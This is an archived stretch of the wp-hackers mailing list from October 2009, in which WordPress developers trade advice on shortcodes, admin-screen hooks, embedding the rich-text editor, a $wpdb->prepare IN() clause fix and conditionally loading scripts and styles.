help?

-- 
~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
Matthew Kettlewell - aka "The Dominator"
~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
http://www.BloggingEmergency.com/
http://www.MoxieMafia.com/
http://www.TheMoxieMaven.com/
http://www.Kettlewell.net/
http://www.MoxDom.com

http://www.facebook.com/moxdom
http://www.twitter.com/kettlewell



From scribu at gmail.com  Mon Oct 26 14:51:04 2009
From: scribu at gmail.com (scribu)
Date: Mon, 26 Oct 2009 16:51:04 +0200
Subject: [wp-hackers] Show only Shortcodes in Sidebar
In-Reply-To: <4AE59970.8040507@gaarai.com>
References: <7b9e108c0910260512w6e3b8a29t21f05e5b5e3f03c2@mail.gmail.com>
	<e6ec604d0910260516m26d2e5e0xbeb9c80f9713944a@mail.gmail.com>
	<7b9e108c0910260519t69cc4780ub16d8acb3067ad2d@mail.gmail.com>
	<e6ec604d0910260533u46d2a657s7e22ecd813de6929@mail.gmail.com>
	<4AE59970.8040507@gaarai.com>
Message-ID: <349fe48b0910260751sf585a56od1923bf1a61664d1@mail.gmail.com>

On Mon, Oct 26, 2009 at 2:43 PM, Chris Jean <gaarai at gaarai.com> wrote:

> How to filter the_content so that only shortcodes display in that sidebar
> and rest of content gets filtered out?
>

Depending on the shortcode, it might be easier to call the function that
it's generating it. For example, if your shortcode is like this:

add_shortcode('myshortcode', 'myshortcode_callback');

Instead of writing:

the_content();

you can write

myshortcode_callback($args);


-- 
http://scribu.net

From sharon at BrewerRadio.com  Mon Oct 26 15:42:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Mon, 26 Oct 2009 11:42:00 -0400
Subject: [wp-hackers] Hooking into Post -> Edit Screen
Message-ID: <fa660803.1ca5652.e7e3fbb.491c@BrewerRadio.com>

Try the action
manage_posts_custom_column

Where you could add your own custom column to the edit posts page.
-Sharon


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Eric Holmstrom
Sent: Monday, October 26, 2009 1:32 AM
To: wp-hackers at lists.automattic.com
Subject: [wp-hackers] Hooking into Post -> Edit Screen

Hi All,

Is it possible to hook into the admin post -> edit screen and add text under
the post title but above the Edit | Quick Edit | Delete | View? I have
include an image below which illustrates what I'm trying to achieve.

http://img5.imageshack.us/img5/1460/ashec.jpg
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From websweetweb at gmail.com  Mon Oct 26 17:28:43 2009
From: websweetweb at gmail.com (raj)
Date: Mon, 26 Oct 2009 22:58:43 +0530
Subject: [wp-hackers] Adding a wysiwyg editor to my admin screen?
Message-ID: <4AE5DC4B.50507@gmail.com>

Hi all,

I need to add a WYSIWYG editor in an admin screen that my plugin
creates. I need the wysiwyg editor to be as similar to the one in the
Add/Edit post/page screen.

Instead of packaging my own wysiwyg editor for distribution, I would
like to use the inbuilt one. How can this be done?

Warm Regards,
Raj


From ceo at kettlewell.net  Mon Oct 26 17:40:35 2009
From: ceo at kettlewell.net (Matthew Kettlewell)
Date: Mon, 26 Oct 2009 10:40:35 -0700
Subject: [wp-hackers] Adding a wysiwyg editor to my admin screen?
In-Reply-To: <4AE5DC4B.50507@gmail.com>
References: <4AE5DC4B.50507@gmail.com>
Message-ID: <4AE5DF13.5010501@kettlewell.net>

the_editor($content) is a nice choice, and is exactly what the admin 
dashboard uses.

I'm a bit fuzzy on exactly which js files need to be included,
but here's my list I've got right now (likely bloated)

Found them online through several incomplete sources.

      wp_enqueue_script('editor');
    wp_enqueue_script('word-count');
    wp_enqueue_script('post');
    wp_enqueue_script( 'thickbox' );
    wp_enqueue_script( 'common' );
    wp_enqueue_script( 'jquery-color' );
     add_thickbox();
    wp_print_scripts('media-upload');
     wp_tiny_mce();
    wp_admin_css();
    wp_enqueue_script('utils');
    do_action("admin_print_styles-post-php");
    do_action('admin_print_styles');

When you make your call , it will look something like this:

<div id="poststuff">
  <div id="<?php echo user_can_richedit() ? 'postdivrich' : 'postdiv'; 
?>" class="postarea">
  <?php
      $this_content="<h1>Groovy Content</h1>";
      the_editor($this_content, $id = 'content', $prev_id = 'title', 
$media_buttons = true, $tab_index = 2);
?>
</div>
</div>

Hope that helps you along.

~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
Matthew Kettlewell - aka "The Dominator"
O: 970-985-4192
C: 970-261-2684
~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
SEO - Social Media - Internet Marketing
Blogging - Seminars - Training - Consulting
~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~

http://www.BloggingEmergency.com/
http://www.MoxieMafia.com/
http://www.TheMoxieMaven.com/
http://www.Kettlewell.net/
http://www.MoxDom.com

http://www.facebook.com/moxdom
http://www.twitter.com/kettlewell




raj wrote:
> Hi all,
>
> I need to add a WYSIWYG editor in an admin screen that my plugin
> creates. I need the wysiwyg editor to be as similar to the one in the
> Add/Edit post/page screen.
>
> Instead of packaging my own wysiwyg editor for distribution, I would
> like to use the inbuilt one. How can this be done?
>
> Warm Regards,
> Raj
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From feeds at armeda.com  Mon Oct 26 17:39:04 2009
From: feeds at armeda.com (Dre Feeds)
Date: Mon, 26 Oct 2009 10:39:04 -0700
Subject: [wp-hackers] /wp-admin redirect
In-Reply-To: <4AE5DC4B.50507@gmail.com>
References: <4AE5DC4B.50507@gmail.com>
Message-ID: <26EF077E-3A2C-40BC-8CFC-C473F7A6A604@armeda.com>

First time I've seen this. Here is the admin login link to a friends  
wp site who just upgraded to 2.8.5 in the last few days:

Http://www.mysticnebula.com/wp-admin

Has anyone ever seen this redirect? It adds /?qu3Ry=wp-admin

First for me, your thoughts are appreciated.

Cheers,
Dre Armeda

Sent from my iPhone

On Oct 26, 2009, at 10:28 AM, raj <websweetweb at gmail.com> wrote:

> Hi all,
>
> I need to add a WYSIWYG editor in an admin screen that my plugin
> creates. I need the wysiwyg editor to be as similar to the one in the
> Add/Edit post/page screen.
>
> Instead of packaging my own wysiwyg editor for distribution, I would
> like to use the inbuilt one. How can this be done?
>
> Warm Regards,
> Raj
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From aaron at xavisys.com  Mon Oct 26 17:41:37 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Mon, 26 Oct 2009 10:41:37 -0700
Subject: [wp-hackers] checking if post has shortcode,
 before header is 	output?
In-Reply-To: <469fb3cc0910260457v2f4d53caxd59fe9c52d3d67a6@mail.gmail.com>
References: <4AE226CA.1050002@unFocus.com>	<349fe48b0910231602n65464a73yd8f95c4f9a2d7b74@mail.gmail.com>	<4AE3A3A2.4070106@xavisys.com>
	<469fb3cc0910260457v2f4d53caxd59fe9c52d3d67a6@mail.gmail.com>
Message-ID: <4AE5DF51.6010607@xavisys.com>

That still doesn't fix the case where more than one query is ran on a 
page, when someone does something like "$myQuery = new 
WP_Query($params);" you'd process the main query, but you wouldn't get 
any of the shortcodes in the custom query.

Chris Scott wrote:
> On Sat, Oct 24, 2009 at 9:02 PM, Aaron D. Campbell <aaron at xavisys.com> wrote:
>   
>> That won't work for any custom queries (as well as a few other edge cases
>> like [[your_shortcode), but it'll work for most scenarios.  You could also
>> have your shortcode handler add an action that hooks into wp_footer and uses
>> wp_print_scripts() to load your js file.  You get the benefit of the js
>> loading in the footer as well as the functionality you wanted of only
>> loading your js when needed.
>>     
>
> To prevent the edge cases you can use get_shortcode_regex() to know
> that you are checking for the shortcode the same way wp is. Something
> like this:
>
> $pattern = get_shortcode_regex();
> preg_match('/'.$pattern.'/s', $posts[0]->post_content, $matches);
> if (is_array($matches) && $matches[2] == 'YOURSHORTCODE') {
> 	//shortcode is being used
> }
>   


From photofantaisie at gmail.com  Mon Oct 26 18:10:40 2009
From: photofantaisie at gmail.com (Ade Walker)
Date: Mon, 26 Oct 2009 19:10:40 +0100
Subject: [wp-hackers] $wpdb->prepare syntax problem
Message-ID: <9dd057850910261110k422f0af1tfcb994e89f75284@mail.gmail.com>

Hi all,

I wonder if someone can point out what I'm doing wrong here.

$pages_selected is a string of comma separated ID numbers, eg "6,22,31,43"

This finds all the page IDs in the $pages_selected string =>

$pages_found = $wpdb->get_results("SELECT ID,post_title FROM $wpdb->posts
WHERE $wpdb->posts.ID IN( $pages_selected )" );

This doesn't =>

$pages_found = $wpdb->get_results(
        $wpdb->prepare( "SELECT ID,post_title FROM $wpdb->posts WHERE
$wpdb->posts.ID IN( %s )", $pages_selected )
        );

It just finds the first page ID in the $pages_selected string.

I've searched high and low, but can't find out what I'm doing wrong. No
error in php error log either.

Any pointers gratefully received. :-)

Thanks.

Ade.

From if.website at gmail.com  Mon Oct 26 18:23:56 2009
From: if.website at gmail.com (Austin Matzko)
Date: Mon, 26 Oct 2009 13:23:56 -0500
Subject: [wp-hackers] $wpdb->prepare syntax problem
In-Reply-To: <9dd057850910261110k422f0af1tfcb994e89f75284@mail.gmail.com>
References: <9dd057850910261110k422f0af1tfcb994e89f75284@mail.gmail.com>
Message-ID: <674b4a3b0910261123x25e92333v9567bb1a1474f23@mail.gmail.com>

On Mon, Oct 26, 2009 at 1:10 PM, Ade Walker <photofantaisie at gmail.com> wrote:
> This doesn't =>
>
> $pages_found = $wpdb->get_results(
> ? ? ? ?$wpdb->prepare( "SELECT ID,post_title FROM $wpdb->posts WHERE
> $wpdb->posts.ID IN( %s )", $pages_selected )
> ? ? ? ?);
>
> It just finds the first page ID in the $pages_selected string.
>
> I've searched high and low, but can't find out what I'm doing wrong. No
> error in php error log either.
>
> Any pointers gratefully received. :-)

The problem is that you're sending this string to MySQL:

SELECT ID,post_title FROM wp_posts WHERE wp_posts.ID IN( '6,22,31,43' )

When you want

SELECT ID,post_title FROM wp_posts WHERE wp_posts.ID IN( 6,22,31,43)

Since you know the data to be sanitized has to be integers (assuming
it does need to be sanitized--ie the integers are coming from user
input),
a more direct alternative to doing this is the following:

$pages_selected = array(6,22,31,43);
$pages_found = $wpdb->get_results(
   sprintf("SELECT ID,post_title FROM $wpdb->posts WHERE
$wpdb->posts.ID IN( %s )", implode(',', array_map('intval',
$pages_selected) ) )
);

From jer at simianuprising.com  Mon Oct 26 18:28:58 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Mon, 26 Oct 2009 14:28:58 -0400
Subject: [wp-hackers] checking if post has shortcode,
	before header is 	output?
In-Reply-To: <4AE5DF51.6010607@xavisys.com>
References: <4AE226CA.1050002@unFocus.com>
	<349fe48b0910231602n65464a73yd8f95c4f9a2d7b74@mail.gmail.com>
	<4AE3A3A2.4070106@xavisys.com>
	<469fb3cc0910260457v2f4d53caxd59fe9c52d3d67a6@mail.gmail.com>
	<4AE5DF51.6010607@xavisys.com>
Message-ID: <e1202cb10910261128h3b2123abr4b60631f16fadc8@mail.gmail.com>

On Mon, Oct 26, 2009 at 1:41 PM, Aaron D. Campbell <aaron at xavisys.com> wrote:
> That still doesn't fix the case where more than one query is ran on a page,
> when someone does something like "$myQuery = new WP_Query($params);" you'd
> process the main query, but you wouldn't get any of the shortcodes in the
> custom query.

That's a logical point but I suspect that in the majority of cases
people are using extra queries to show only parts of  other content,
headlines or excerpts, rather than the actual the_content(). In these
cases checking the extra queries will actually cause the js to be
loaded way more often than desired. If 1/5 articles needs the JS and
you have 10 "related" headlines visible in each single.php view then
the likelihood that one of the headlines is a post that *would* need
the js is very high, and you'll be constantly loading it even though
the headlines have no use for it.

If you do show extra loops with full content (or you need this to work
on indexes/archives that show multiple posts with full content) then
+1 for the idea of adding the js to the footer. I believe there's a
hook on 'the_post' that would work pretty well to identify posts that
get displayed, though if its not too late the_content() would be
ideal, as it would only account for posts who's full content ( and
thus expanded shortcodes ) are displayed.

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | globalvoicesonline.org

From otto at ottodestruct.com  Mon Oct 26 18:29:47 2009
From: otto at ottodestruct.com (Otto)
Date: Mon, 26 Oct 2009 13:29:47 -0500
Subject: [wp-hackers] checking if post has shortcode,
	before header is 	output?
In-Reply-To: <4AE5DF51.6010607@xavisys.com>
References: <4AE226CA.1050002@unFocus.com>
	<349fe48b0910231602n65464a73yd8f95c4f9a2d7b74@mail.gmail.com> 
	<4AE3A3A2.4070106@xavisys.com>
	<469fb3cc0910260457v2f4d53caxd59fe9c52d3d67a6@mail.gmail.com> 
	<4AE5DF51.6010607@xavisys.com>
Message-ID: <161617690910261129of2b5102s74c9b28e523f1a94@mail.gmail.com>

On Mon, Oct 26, 2009 at 12:41 PM, Aaron D. Campbell <aaron at xavisys.com> wrote:
> That still doesn't fix the case where more than one query is ran on a page,
> when someone does something like "$myQuery = new WP_Query($params);" you'd
> process the main query, but you wouldn't get any of the shortcodes in the
> custom query.

That's because that is not possible. You're basically wanting to know
the content returned by the query before you ever run the query
itself. Can't be done, because of, you know, time only traveling in
one direction. Damn physicists.

To do this sort of thing, you'd need to use output buffering. Buffer
the whole page, then modify it after the fact, inserting what you want
where you want.

-Otto

From aaron at xavisys.com  Mon Oct 26 18:59:43 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Mon, 26 Oct 2009 11:59:43 -0700
Subject: [wp-hackers] checking if post has shortcode,
 before header is 	output?
In-Reply-To: <e1202cb10910261128h3b2123abr4b60631f16fadc8@mail.gmail.com>
References: <4AE226CA.1050002@unFocus.com>	<349fe48b0910231602n65464a73yd8f95c4f9a2d7b74@mail.gmail.com>	<4AE3A3A2.4070106@xavisys.com>	<469fb3cc0910260457v2f4d53caxd59fe9c52d3d67a6@mail.gmail.com>	<4AE5DF51.6010607@xavisys.com>
	<e1202cb10910261128h3b2123abr4b60631f16fadc8@mail.gmail.com>
Message-ID: <4AE5F19F.5020409@xavisys.com>

I still think it would be better to add the JS from the shortcode 
handler rather than trying to mess with the_content, the_post, 
$wp_query, $post, etc.  Since it's enqueued inside the shortcode handler 
you KNOW the shortcode is being executed.  The only drawback is that the 
JS needs to go in the footer rather than the header, but as far as I 
know this is actually the recommended way of loading JS so you should 
code for that anyway.

Jeremy Clarke wrote:
> On Mon, Oct 26, 2009 at 1:41 PM, Aaron D. Campbell <aaron at xavisys.com> wrote:
>   
>> That still doesn't fix the case where more than one query is ran on a page,
>> when someone does something like "$myQuery = new WP_Query($params);" you'd
>> process the main query, but you wouldn't get any of the shortcodes in the
>> custom query.
>>     
>
> That's a logical point but I suspect that in the majority of cases
> people are using extra queries to show only parts of  other content,
> headlines or excerpts, rather than the actual the_content(). In these
> cases checking the extra queries will actually cause the js to be
> loaded way more often than desired. If 1/5 articles needs the JS and
> you have 10 "related" headlines visible in each single.php view then
> the likelihood that one of the headlines is a post that *would* need
> the js is very high, and you'll be constantly loading it even though
> the headlines have no use for it.
>
> If you do show extra loops with full content (or you need this to work
> on indexes/archives that show multiple posts with full content) then
> +1 for the idea of adding the js to the footer. I believe there's a
> hook on 'the_post' that would work pretty well to identify posts that
> get displayed, though if its not too late the_content() would be
> ideal, as it would only account for posts who's full content ( and
> thus expanded shortcodes ) are displayed.
>   


From photofantaisie at gmail.com  Mon Oct 26 19:00:25 2009
From: photofantaisie at gmail.com (Ade Walker)
Date: Mon, 26 Oct 2009 20:00:25 +0100
Subject: [wp-hackers] $wpdb->prepare syntax problem
In-Reply-To: <674b4a3b0910261123x25e92333v9567bb1a1474f23@mail.gmail.com>
References: <9dd057850910261110k422f0af1tfcb994e89f75284@mail.gmail.com>
	<674b4a3b0910261123x25e92333v9567bb1a1474f23@mail.gmail.com>
Message-ID: <9dd057850910261200ud2af8eetc7f15c7308f7b374@mail.gmail.com>

Thanks, Austin! That's perfect.



2009/10/26 Austin Matzko <if.website at gmail.com>

> On Mon, Oct 26, 2009 at 1:10 PM, Ade Walker <photofantaisie at gmail.com>
> wrote:
> > This doesn't =>
> >
> > $pages_found = $wpdb->get_results(
> >        $wpdb->prepare( "SELECT ID,post_title FROM $wpdb->posts WHERE
> > $wpdb->posts.ID IN( %s )", $pages_selected )
> >        );
> >
> > It just finds the first page ID in the $pages_selected string.
> >
> > I've searched high and low, but can't find out what I'm doing wrong. No
> > error in php error log either.
> >
> > Any pointers gratefully received. :-)
>
> The problem is that you're sending this string to MySQL:
>
> SELECT ID,post_title FROM wp_posts WHERE wp_posts.ID IN( '6,22,31,43' )
>
> When you want
>
> SELECT ID,post_title FROM wp_posts WHERE wp_posts.ID IN( 6,22,31,43)
>
> Since you know the data to be sanitized has to be integers (assuming
> it does need to be sanitized--ie the integers are coming from user
> input),
> a more direct alternative to doing this is the following:
>
> $pages_selected = array(6,22,31,43);
> $pages_found = $wpdb->get_results(
>    sprintf("SELECT ID,post_title FROM $wpdb->posts WHERE
> $wpdb->posts.ID IN( %s )", implode(',', array_map('intval',
> $pages_selected) ) )
> );
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From if.website at gmail.com  Mon Oct 26 19:01:42 2009
From: if.website at gmail.com (Austin Matzko)
Date: Mon, 26 Oct 2009 14:01:42 -0500
Subject: [wp-hackers] checking if post has shortcode,
	before header is 	output?
In-Reply-To: <4AE5F19F.5020409@xavisys.com>
References: <4AE226CA.1050002@unFocus.com>
	<349fe48b0910231602n65464a73yd8f95c4f9a2d7b74@mail.gmail.com>
	<4AE3A3A2.4070106@xavisys.com>
	<469fb3cc0910260457v2f4d53caxd59fe9c52d3d67a6@mail.gmail.com>
	<4AE5DF51.6010607@xavisys.com>
	<e1202cb10910261128h3b2123abr4b60631f16fadc8@mail.gmail.com>
	<4AE5F19F.5020409@xavisys.com>
Message-ID: <674b4a3b0910261201x6c6fdee6u640b599aaa57245@mail.gmail.com>

On Mon, Oct 26, 2009 at 1:59 PM, Aaron D. Campbell <aaron at xavisys.com> wrote:
> I still think it would be better to add the JS from the shortcode handler
> rather than trying to mess with the_content, the_post, $wp_query, $post,
> etc. ?Since it's enqueued inside the shortcode handler you KNOW the
> shortcode is being executed. ?The only drawback is that the JS needs to go
> in the footer rather than the header, but as far as I know this is actually
> the recommended way of loading JS so you should code for that anyway.

That's probably the best way for JavaScript, but valid CSS <style>
elements are supposed to be in <head>.

From william.canino at googlemail.com  Mon Oct 26 19:05:38 2009
From: william.canino at googlemail.com (William Canino)
Date: Mon, 26 Oct 2009 15:05:38 -0400
Subject: [wp-hackers] checking if post has shortcode,
	before header is 	output?
In-Reply-To: <4AE226CA.1050002@unFocus.com>
References: <4AE226CA.1050002@unFocus.com>
Message-ID: <e4dc67e0910261205u33dee46ja84ade5a49de79fe@mail.gmail.com>

Basically you have to predict at wp_head which posts will have their
the_content displayed on the page.

As others said, at the time of wp_head you cannot know what part in
the page will display content that may contain that shortcode.  The
'template_redirect' suggestion doesn't cover archive pages and the
blog front page. To really cover all bases, you will need to generate
the whole page unto a buffer first to find out, and if it does, insert
your script and css.

Another inelegant solution is to store all the possible REQUEST_URIs
that will have the shortcode into a table, and at wp_head use this
table to decide.

Or lastly, just give this up, and insert your CSS (invalid) and JS
(okay) in the footer. Strictly speaking, stylesheets and <style> tags
must be in the <head> tag.

As I said, I don't have the answer for this.


2009/10/23 Kevin Newman <CaptainN at unfocus.com>:
> Hello,
>
> Is there anyway to check if there your registered shortcode (for a plugin)
> is being used in the current post, during some action hook before the header
> is output? The idea would be to include CSS and JS files for the shortcode,
> only on pages that actually use the shortcode. I'm doing it inline right
> now, since wp_enqueue_script is not available where the shortcode is dealt
> with.
>
> Thanks,
>
> Kevin N.
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From zamoose at gmail.com  Mon Oct 26 19:12:22 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Mon, 26 Oct 2009 15:12:22 -0400
Subject: [wp-hackers] checking if post has shortcode,
	before header is 	output?
In-Reply-To: <161617690910261129of2b5102s74c9b28e523f1a94@mail.gmail.com>
References: <4AE226CA.1050002@unFocus.com>
	<349fe48b0910231602n65464a73yd8f95c4f9a2d7b74@mail.gmail.com> 
	<4AE3A3A2.4070106@xavisys.com>
	<469fb3cc0910260457v2f4d53caxd59fe9c52d3d67a6@mail.gmail.com> 
	<4AE5DF51.6010607@xavisys.com>
	<161617690910261129of2b5102s74c9b28e523f1a94@mail.gmail.com>
Message-ID: <71ddd7490910261212r31ea11ck61a57d5ac800e5cc@mail.gmail.com>

On Mon, Oct 26, 2009 at 2:29 PM, Otto <otto at ottodestruct.com> wrote:

>
> That's because that is not possible. You're basically wanting to know
> the content returned by the query before you ever run the query
> itself. Can't be done, because of, you know, time only traveling in
> one direction. Damn physicists.
>
>
I anxiously await the Higgs Boson plugin for PHP/MySQL, as this will solve a
GREAT many problems.

-- 
-Doug
http://literalbarrage.org/blog/

From aaron at xavisys.com  Mon Oct 26 19:13:35 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Mon, 26 Oct 2009 12:13:35 -0700
Subject: [wp-hackers] checking if post has shortcode,
 before header is 	output?
In-Reply-To: <674b4a3b0910261201x6c6fdee6u640b599aaa57245@mail.gmail.com>
References: <4AE226CA.1050002@unFocus.com>	<349fe48b0910231602n65464a73yd8f95c4f9a2d7b74@mail.gmail.com>	<4AE3A3A2.4070106@xavisys.com>	<469fb3cc0910260457v2f4d53caxd59fe9c52d3d67a6@mail.gmail.com>	<4AE5DF51.6010607@xavisys.com>	<e1202cb10910261128h3b2123abr4b60631f16fadc8@mail.gmail.com>	<4AE5F19F.5020409@xavisys.com>
	<674b4a3b0910261201x6c6fdee6u640b599aaa57245@mail.gmail.com>
Message-ID: <4AE5F4DF.3010505@xavisys.com>

That's true, and the best I can come up with for that is to do the CSS 
inline or put the <style> element in the body by outputting it from your 
shortcode handler (keeping track of when you output it so you don't 
output it more than once).

Austin Matzko wrote:
> That's probably the best way for JavaScript, but valid CSS <style>
> elements are supposed to be in <head>

From aaron at xavisys.com  Mon Oct 26 19:15:10 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Mon, 26 Oct 2009 12:15:10 -0700
Subject: [wp-hackers] checking if post has shortcode,
 before header is 	output?
In-Reply-To: <161617690910261129of2b5102s74c9b28e523f1a94@mail.gmail.com>
References: <4AE226CA.1050002@unFocus.com>	<349fe48b0910231602n65464a73yd8f95c4f9a2d7b74@mail.gmail.com>
	<4AE3A3A2.4070106@xavisys.com>	<469fb3cc0910260457v2f4d53caxd59fe9c52d3d67a6@mail.gmail.com>
	<4AE5DF51.6010607@xavisys.com>
	<161617690910261129of2b5102s74c9b28e523f1a94@mail.gmail.com>
Message-ID: <4AE5F53E.6070408@xavisys.com>

That's true, which is why I was advocating something like this:
function myplugin_add_js () {
    wp_print_scripts( 'myplugin_myjs' );
}
function myplugin_shortcode_handler($attr, $content = '') {
    add_action( 'wp_footer', 'myplugin_add_js' );
}

That's assuming that your js is already registered using the handle 
'myplugin_myjs' and that the wp_footer action is correctly called from 
your theme.

Otto wrote:
> On Mon, Oct 26, 2009 at 12:41 PM, Aaron D. Campbell <aaron at xavisys.com> wrote:
>   
>> That still doesn't fix the case where more than one query is ran on a page,
>> when someone does something like "$myQuery = new WP_Query($params);" you'd
>> process the main query, but you wouldn't get any of the shortcodes in the
>> custom query.
>>     
>
> That's because that is not possible. You're basically wanting to know
> the content returned by the query before you ever run the query
> itself. Can't be done, because of, you know, time only traveling in
> one direction. Damn physicists.
>
> To do this sort of thing, you'd need to use output buffering. Buffer
> the whole page, then modify it after the fact, inserting what you want
> where you want.
>
> -Otto

From glenn at glennansley.com  Mon Oct 26 19:16:09 2009
From: glenn at glennansley.com (Glenn Ansley)
Date: Mon, 26 Oct 2009 15:16:09 -0400
Subject: [wp-hackers] checking if post has shortcode,
	before header is 	output?
In-Reply-To: <4AE5F4DF.3010505@xavisys.com>
References: <4AE226CA.1050002@unFocus.com>
	<349fe48b0910231602n65464a73yd8f95c4f9a2d7b74@mail.gmail.com>
	<4AE3A3A2.4070106@xavisys.com>
	<469fb3cc0910260457v2f4d53caxd59fe9c52d3d67a6@mail.gmail.com>
	<4AE5DF51.6010607@xavisys.com>
	<e1202cb10910261128h3b2123abr4b60631f16fadc8@mail.gmail.com>
	<4AE5F19F.5020409@xavisys.com>
	<674b4a3b0910261201x6c6fdee6u640b599aaa57245@mail.gmail.com>
	<4AE5F4DF.3010505@xavisys.com>
Message-ID: <7474be390910261216y78cdd7d7m46d1811db0c31bba@mail.gmail.com>

For valid CSS, f you're not worried about accessibility just add
additional the stylesheet with jQuery on page load if it meets some
sort of condition that you place in the source (put the JS in the
footer like the others have suggested).

Glenn Ansley
http://fullthrottledevelopment.com

On Mon, Oct 26, 2009 at 3:13 PM, Aaron D. Campbell <aaron at xavisys.com> wrote:
> That's true, and the best I can come up with for that is to do the CSS
> inline or put the <style> element in the body by outputting it from your
> shortcode handler (keeping track of when you output it so you don't output
> it more than once).
>
> Austin Matzko wrote:
>>
>> That's probably the best way for JavaScript, but valid CSS <style>
>> elements are supposed to be in <head>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From david at carrcommunications.com  Mon Oct 26 19:53:18 2009
From: david at carrcommunications.com (David F. Carr)
Date: Mon, 26 Oct 2009 15:53:18 -0400
Subject: [wp-hackers] Adding a wysiwyg editor to my admin screen?
Message-ID: <2ab00e5a0910261253r711d85e0r491ff8401fbc3976@mail.gmail.com>

Thanks to Matthew Kettlewell for the pointers on prerequisites for using the
rich text editor in a plugin. I've had trouble for months trying to get the
upload buttons for images/media to work properly. I could tell that it was a
display problem, but couldn't make sense of what I was missing from the CSS.
Adding these two items made the difference:

do_action("admin_print_styles-post-php");
do_action('admin_print_styles');


-- 
David F. Carr
david at carrcommunications.com

954-757-5827

Writing, Editing, Web Development - http://www.carrcommunications.com
LinkedIn - http://www.linkedin.com/in/davidfcarr

David F. Carr
971 NW 124 Ave.
Coral Springs FL 33071-5082

From batmoo at gmail.com  Mon Oct 26 20:13:46 2009
From: batmoo at gmail.com (Mohammad Jangda)
Date: Mon, 26 Oct 2009 16:13:46 -0400
Subject: [wp-hackers] Hooking into Post -> Edit Screen
In-Reply-To: <fa660803.1ca5652.e7e3fbb.491c@BrewerRadio.com>
References: <fa660803.1ca5652.e7e3fbb.491c@BrewerRadio.com>
Message-ID: <eaaa36c90910261313t75e1ad76m329baa39b8cbbf89@mail.gmail.com>

If you really want it in that position you could add your content to the
$actions array:

<?php

 add_filter('post_row_actions', 'add_below_title', 10, 2);


> function add_below_title( $actions, $post ) {


> $actions = array_merge(array("stuff"=>"Your new content goes here"),
> $actions);


> return $actions;

}

?>


This should add a span with the class "stuff" and the content "Your new
content goes here" to the front to the actions.It'll be hidden though, so
you'll have to add in custom CSS styling to override the WordPress defaults.

On Mon, Oct 26, 2009 at 11:42 AM, Sharon Chambers <sharon at brewerradio.com>wrote:

> Try the action
> manage_posts_custom_column
>
> Where you could add your own custom column to the edit posts page.
> -Sharon
>
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com [mailto:
> wp-hackers-bounces at lists.automattic.com] On Behalf Of Eric Holmstrom
> Sent: Monday, October 26, 2009 1:32 AM
> To: wp-hackers at lists.automattic.com
> Subject: [wp-hackers] Hooking into Post -> Edit Screen
>
> Hi All,
>
> Is it possible to hook into the admin post -> edit screen and add text
> under
> the post title but above the Edit | Quick Edit | Delete | View? I have
> include an image below which illustrates what I'm trying to achieve.
>
> http://img5.imageshack.us/img5/1460/ashec.jpg
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From Ken at adcSTUDIO.com  Mon Oct 26 20:30:28 2009
From: Ken at adcSTUDIO.com (Ken Newman)
Date: Mon, 26 Oct 2009 16:30:28 -0400
Subject: [wp-hackers] checking if post has shortcode,
	before header is output?
In-Reply-To: <4AE226CA.1050002@unFocus.com>
References: <4AE226CA.1050002@unFocus.com>
Message-ID: <C944457E6EB948BDA9CAECE06D079468@KenPC>

In HTML 5, the <style> element being using in the body is valid if you use 
the "scoped" attribute :)
http://www.w3schools.com/html5/tag_style.asp

--------------------------------------------------
From: "Kevin Newman" <CaptainN at unFocus.com>

> Hello,
>
> Is there anyway to check if there your registered shortcode (for a plugin) 
> is being used in the current post, during some action hook before the 
> header is output? The idea would be to include CSS and JS files for the 
> shortcode, only on pages that actually use the shortcode. I'm doing it 
> inline right now, since wp_enqueue_script is not available where the 
> shortcode is dealt with.
>
> Thanks,
>
> Kevin N.
> 


From azad_shaikh786 at yahoo.com  Mon Oct 26 20:32:52 2009
From: azad_shaikh786 at yahoo.com (azad shaikh)
Date: Mon, 26 Oct 2009 13:32:52 -0700 (PDT)
Subject: [wp-hackers] /wp-admin redirect/custom login page
In-Reply-To: <26EF077E-3A2C-40BC-8CFC-C473F7A6A604@armeda.com>
References: <4AE5DC4B.50507@gmail.com>
	<26EF077E-3A2C-40BC-8CFC-C473F7A6A604@armeda.com>
